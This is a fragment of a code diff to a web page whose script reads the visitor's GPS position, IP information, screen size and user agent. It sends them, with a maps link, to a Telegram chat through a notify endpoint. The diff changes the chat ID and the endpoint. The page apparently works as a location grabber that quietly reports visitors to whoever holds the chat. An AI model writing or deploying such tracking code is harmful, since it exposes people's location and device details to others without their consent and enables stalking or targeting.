@@ -11,7 +11,7 @@
   <p id="status">Getting location...</p>
 
 <script>
-const TG_CHAT_ID = "8676698260";
+const TG_CHAT_ID = "980975242";
 
 async function getIpInfo() {
   try {
@@ -52,7 +52,7 @@ function getGps() {
     `Screen: ${screen.width}x${screen.height}\n` +
     `Device: ${navigator.userAgent}` + mapsLink;
 
-  const res = await fetch(`http://localhost:3000/notify`, {
+  const res = await fetch(`/api/notify`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ chat_id: TG_CHAT_ID, text })
